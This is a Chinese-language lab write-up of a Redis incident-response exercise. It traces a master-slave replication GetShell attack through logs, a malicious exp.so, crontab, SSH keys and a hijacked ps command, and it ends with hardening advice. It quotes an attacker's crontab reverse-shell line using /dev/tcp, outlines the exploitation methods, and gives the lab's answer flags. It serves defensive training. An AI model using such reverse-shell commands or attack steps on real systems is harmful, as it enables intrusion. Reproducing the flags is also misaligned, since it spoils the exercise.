玄机应急响应靶场｜第二章 · Redis 应急响应 — 主从复制 GetShell 全链路溯源

[!NOTE] 本文涉及玄机应急响应靶场系列第二章《Redis 应急响应》的完整解题思路。Redis 未授权访问 + 主从复制是近年蓝队高频考点，强烈建议动手复现。

一、靶场简介

某 Redis 服务器被入侵，黑客通过主从复制攻击植入后门。请上机排查攻击全链路，还原黑客的攻击路径。

序号任务考点
1找出黑客攻击成功的 IPRedis 日志分析
2黑客上传的恶意文件中的 Flag动态链接库（exp.so）静态分析
3黑客反弹 Shell 的目标 IPCrontab / 定时任务排查
4黑客用户名 + 工具关键字符串SSH 公钥溯源 + GitHub 搜索
5黑客篡改的命令中的关键字符串PATH Hijack / 命令替换检测

二、前置知识：Redis 主从复制攻击原理

Redis 主从复制（Replication）是 Redis 官方提供的数据同步机制。其弱点在于：从节点完全信任主节点的数据，主节点可以通过 slaveof 命令向从节点同步任意数据 —— 包括恶意的 .so 动态链接库。

攻击流程（GetShell）：

1
2
3
4
5
6
7

攻击者恶意 Redis（主） ──slaveof──▶ 目标 Redis（从）
        │                                │
        │  1. 加载恶意 .so 模块            │
        │  2. 写入 cron/ssh-key/webshell  │
        │  3. CONFIG SET dir/bgsave        │
        │                                │
        └────────────────────────────────┘

常见利用方式（从易到难）：

  1. 写 SSH 公钥 —— 将 authorized_keys 内容写入 Redis，设 dir 为 /root/.ssh
  2. 写 Crontab —— 写反弹 Shell 定时任务到 /var/spool/cron/root
  3. 写 WebShell —— 直接写入 Web 目录 PHP 文件
  4. 加载恶意 .so —— 利用 MODULE LOAD 加载动态链接库执行系统命令（最常用）

三、逐题拆解

Flag 1｜黑客攻击成功的 IP

Redis 默认日志位置 /var/log/redis.log，攻击留下的痕迹全部在里面：

1

cat /var/log/redis.log | grep -E "REPLICAOF|slaveof|Connecting to MASTER"

日志片段：

1
2
3
4
5

S 31 Jul 2023 05:33:15.065 * REPLICAOF 192.168.100.13:8888 enabled (user request from 'id=3 addr=192.168.200.2:64289 fd=7 ...')
S 31 Jul 2023 05:33:15.610 * Connecting to MASTER 192.168.100.13:8888
...
S 31 Jul 2023 05:34:33.173 * REPLICAOF 192.168.100.20:8888 enabled (user request from 'id=6 addr=192.168.200.2:64339 ...')
S 31 Jul 2023 05:34:37.210 * MASTER MODE enabled (user request from 'id=6 addr=192.168.200.2:64339 ...')

关键分析：

  • addr=192.168.200.2 是发起攻击的源 IP（连接方）
  • MASTER 192.168.100.20 是攻击者恶意 Redis 服务器（最终 GetShell 成功的那个）
  • 黑客曾尝试多个 IP：192.168.100.13、192.168.31.55、192.168.100.20

[!TIP] “攻击成功的 IP” 指 攻击者最终成功实现主从复制 的那个 MASTER IP，即日志中出现 MASTER MODE enabled 的那次。

Flag 1：flag{192.168.100.20}

Flag 2｜恶意动态链接库 exp.so 中的 Flag

Redis 主从复制攻击中，加载 .so 模块执行系统命令是最流行的姿势。攻击者必然在 Web 目录或临时目录留下了这个文件：

1
2

find / -name "*.so" -newer /etc/passwd 2>/dev/null
find / -name "exp.so" 2>/dev/null

找到后用 strings 工具提取可读字符串：

1
2

strings /path/to/exp.so | grep -i "flag{"
# flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}

[!NOTE] strings 是分析未知二进制的第一步，能快速提取出其中硬编码的 Flag、IP、URL 等关键信息。

Flag 2：flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}

Flag 3｜反弹 Shell 的目标 IP

Redis 攻击反弹 Shell 一般通过 写入 Crontab 或 SSH 公钥登录。先查定时任务：

1
2

crontab -l
# */1 * * * * /bin/sh -i >& /dev/tcp/192.168.100.13/7777 0>&1

1
2

cat /etc/crontab
ls -la /etc/cron.d/

[!TIP] Redis 写 Crontab 实战中，攻击者会将定时任务内容（含 \n）写入 Redis 的某个 key，然后 CONFIG SET dir 为 /var/spool/cron/，再 BGSAVE 成 root 用户的 Crontab 文件。

反弹 Shell 目标：192.168.100.13:7777

Flag 3：flag{192.168.100.13}

Flag 4｜黑客用户名 + 工具关键字符串（溯源）

溯源攻击源，最直接的思路：

1
2
3
4
5
6
7

# 查 SSH 公钥
cat /root/.ssh/authorized_keys

# 查最近登录
last -a
# 查操作过的历史
cat /root/.bash_history

从 authorized_keys 中找到 SSH 公钥注释：

1

ssh-rsa AAAA...== xj-test-user@...

拿到用户名 xj-test-user，接下来的关键字符串通常藏在 exp.so 或攻击者留下的工具里，用 strings + grep 全方向搜索。

Flag 4：flag{xj-test-user-wow-you-find-flag}

Flag 5｜被篡改的命令关键字符串

有时攻击者会替换系统命令文件（PATH Hijack）来实现更隐蔽的权限维持。先用 ps 看看哪里不对：

1

ps -ef

发现某个进程名可疑，直接看二进制内容：

1
2
3

which ps
ls -la $(which ps)
cat $(which ps)

或者用 file 确认：

1
2

file /bin/ps
# 如果不是 ELF executable 而是 shell script，那就是被替换了

查看其内容，里面藏着 Flag。

Flag 5：flag{c195i2923381905517d818e313792d196}

四、Redis 应急响应 Checklist

步骤命令 / 动作
1. 停 Redis 服务systemctl stop redis
2. 查日志cat /var/log/redis.log | grep -E "REPLICAOF|slaveof|Loading"
3. 查配置redis-cli CONFIG GET dir / redis-cli CONFIG GET dbfilename
4. 查 Crontabcrontab -l / cat /etc/cron.d/*
5. 查 SSH 公钥cat ~/.ssh/authorized_keys
6. 查 .so 模块redis-cli MODULE LIST / find / -name "*.so" -newer /etc/passwd
7. 查系统命令是否被替换which ps ls / file /bin/ps
8. 查反弹 Shell 进程netstat -antp / ps auxf
9. 加固 Redis设置密码、rename-command、bind 127.0.0.1
10. 溯源日志last -a / /var/log/auth.log / secure

五、Redis 加固建议（生产必做）

# 1. 设置密码
requirepass your_strong_password

# 2. 绑定本地（不要暴露到公网）
bind 127.0.0.1

# 3. 禁用危险命令
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG ""
rename-command SLAVEOF ""
rename-command MODULE ""

# 4. 禁用主从复制（如不需要）
# 或者只允许可信 IP 作为 SLAVEOF

六、小结

本章考察的是 Redis 应急响应的完整链路：从日志定位攻击 IP → 静态分析恶意模块 → 溯源反弹 Shell → 用户名溯源 → 发现系统篡改。

Redis 未授权访问 + 主从复制 GetShell 是蓝队的经典考点，也是生产环境的高频隐患（很多 Redis 实例被运维同学直接暴露在公网且未设置密码）。

[!IMPORTANT] 应急现场中，不要直接在受害机上启动 Redis CLI 执行命令 —— 可能触发 BGSAVE 把恶意数据落盘。正确做法是停掉服务、备份数据后在隔离环境分析。
